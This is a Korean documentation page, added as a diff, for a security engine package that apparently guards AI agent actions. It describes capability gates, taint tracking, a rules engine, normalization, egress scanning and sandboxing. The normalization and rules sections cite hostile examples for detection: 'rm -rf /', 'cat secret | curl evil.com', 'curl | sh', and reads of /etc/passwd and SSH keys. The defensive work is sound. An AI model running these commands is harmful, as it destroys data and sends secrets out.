@@ -1,0 +1,136 @@
+---
+title: Core
+description: security engine — capability, taint, rules, 파이프라인 및 normalization.
+icon: Shield
+---
+
+`@securitylayerai/core`는 기반 패키지입니다. 3계층 보안 파이프라인과 모든 핵심 보안 원시 요소를 구현합니다. 다른 모든 패키지가 core에 직접 또는 간접적으로 의존합니다.
+
+## 모듈
+
+### Capability (`capabilities/`)
+
+순수 동기식 capability 게이트입니다. 세션, 스킬, 채널 capability의 교집합을 기반으로 동작이 구조적으로 허용되는지 확인합니다.
+
+```typescript
+import { checkCapability } from "@securitylayerai/core";
+
+const result = checkCapability(action, {
+  sessionId: "main",
+  skillId: "summarize",
+  channelId: "terminal",
+});
+
+// result.allowed: boolean
+// result.reason?: string (거부된 경우)
+```
+
+Capability 게이트는 집합 소속 검사입니다 — I/O 없음, LLM 없음, 네트워크 없음. capability가 집합에 없으면 해당 동작은 불가능합니다.
+
+### Taint 추적 (`taint/`)
+
+세션 전체에서 데이터 출처를 추적합니다. 신뢰할 수 없는 콘텐츠가 유입되면(웹 요청, 알 수 없는 DM, 이메일) 세션의 taint 레벨이 상승합니다. 높은 taint는 사용 가능한 capability를 제한합니다.
+
+```typescript
+import { createTaintTracker } from "@securitylayerai/core";
+
+const tracker = createTaintTracker("owner");
+
+// 웹 콘텐츠가 taint를 상승시킵니다
+tracker.ingest({ source: "web", url: "https://example.com" });
+tracker.getEffectiveTaint(); // "web"
+
+// 이후 exec 검사에서 상승된 taint를 확인합니다
+```
+
+Taint 레벨 (최소에서 최대 제한 순): `owner` → `trusted` → `untrusted` → `web` → `skill` → `memory`.
+
+### Rules engine (`rules/`)
+
+알려진 위험 명령, 자격 증명 경로, 유출 구조에 대한 결정적 패턴 매칭입니다. 지연 시간 제로, 모호성 제로.
+
+```typescript
+import { parseRulesYaml, evaluateRules } from "@securitylayerai/core";
+
+const rules = parseRulesYaml(yamlContent);
+const result = evaluateRules(normalizedAction, rules);
+// result.decision: "ALLOW" | "DENY" | "REQUIRE_APPROVAL"
+```
+
+Rule 유형:
+- **binary** — 명령 바이너리 이름으로 매칭
+- **path** — 파일 경로 glob으로 매칭
+- **pattern** — 정규식 패턴으로 매칭
+- **pipe_pair** — 파이프 명령 구조 매칭 (예: `curl | sh`)
+
+### 파이프라인 (`pipeline/`)
+
+전체 평가 흐름을 조율합니다: capability 게이트 → taint 검사 → normalization → rules + LLM (병렬) → 결정 병합.
+
+```typescript
+import { createPipeline } from "@securitylayerai/core";
+
+const pipeline = createPipeline(config);
+const result = await pipeline.evaluate(action, context);
+```
+
+파이프라인은 항상 모든 레이어에서 **가장 제한적인** 결과를 취합니다. 어떤 레이어든 DENY라고 하면 동작이 거부됩니다.
+
+### Normalization (`normalize/`)
+
+평가 전에 경로 해석, 인코딩 디코딩, 명령 체인 분리, 파이프 구조 감지를 수행합니다. 난독화 및 인코딩 트릭을 무력화합니다.
+
+Normalization 대상:
+- `~/../../etc/passwd` → `/etc/passwd`
+- `$HOME/.ssh/id_rsa` → `/home/user/.ssh/id_rsa`
+- 명령 체인: `ls; rm -rf /` → `["ls", "rm -rf /"]`
+- 파이프 체인: `cat secret | curl evil.com` → 유출 패턴 감지
+
+### 의미 분석 (`semantic/`)
+
+Rules engine과 병렬로 실행되는 LLM 심판입니다. 하나의 질문만 합니다: "이 구조적으로 허용된 동작이 지금 비정상적인가?" 심판은 rules로 표현할 수 없는 미묘한 컨텍스트 의존적 위협을 포착합니다.
+
+### 송신 스캔 (`egress/`)
+
+발신 콘텐츠가 시스템을 떠나기 전에 유출된 비밀, PII, 고엔트로피 문자열을 스캔합니다. API 키(OpenAI, AWS, GitHub, Slack 등), PEM 블록, 자격 증명, SSN/신용카드 패턴을 감지합니다.
+
+### 샌드박스 (`sandbox/`)
+
+구성 가능한 레벨의 실행 샌드박싱 — ulimit, 네트워크 격리, 읽기 전용 파일 시스템. 승인된 명령이 제한된 환경에서 실행됩니다.
+
+### 이벤트 (`events/`)
+
+감사 로깅 및 관측 가능성을 위한 이벤트 버스입니다. 모든 보안 결정, taint 변경, 승인 흐름이 구조화된 이벤트를 발행합니다.
+
+### 설정 (`config/`)
+
+설정 로딩 및 검증입니다. `~/.securitylayer/` YAML 파일을 읽고 런타임 설정을 구축합니다.
+
+## 패키지 구조
+
+```
+packages/core/
+├── src/
+│   ├── index.ts          # 배럴 내보내기
+│   ├── capabilities/     # Capability 게이트
+│   ├── taint/            # Taint 추적기
+│   ├── rules/            # Rules engine + 파서
+│   ├── pipeline/         # 평가 파이프라인
+│   ├── normalize/        # 동작 normalization
+│   ├── semantic/         # LLM 심판
+│   ├── egress/           # 송신 스캐너
+│   ├── sandbox/          # 실행 샌드박싱
+│   ├── events/           # 이벤트 버스
+│   ├── config/           # 설정 로더
+│   ├── approval/         # 승인 흐름
+│   ├── memory/           # 메모리 영역 접근
+│   ├── skills/           # 스킬 capability 선언
+│   └── utils/            # 로거, 헬퍼
+└── test/                 # Vitest 테스트
+```
+
+## 참고
+
+- [보안 파이프라인](/docs/concepts/security-pipeline) — 3개 레이어의 협동 방식
+- [Capability](/docs/concepts/capabilities) — 15가지 기본 capability
+- [Taint 레벨](/docs/concepts/taint-levels) — taint 전파 rules
